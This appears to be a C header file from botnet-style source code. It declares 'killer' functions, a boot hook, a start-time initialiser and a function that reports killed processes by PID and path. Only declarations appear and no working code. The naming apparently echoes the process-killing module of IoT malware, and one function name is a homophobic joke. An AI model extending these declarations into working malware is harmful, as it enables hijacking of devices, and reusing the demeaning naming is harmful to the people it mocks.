#pragma once

/* dont initialize variables in a .h file men wtf, extern exists */
//int conn_pid;

void killer_lol();

void killer_kill();

void killer_boot();

void starttime_init();

void dam_bot_she_gay();

void report_kill2(int pid, const char* realpath);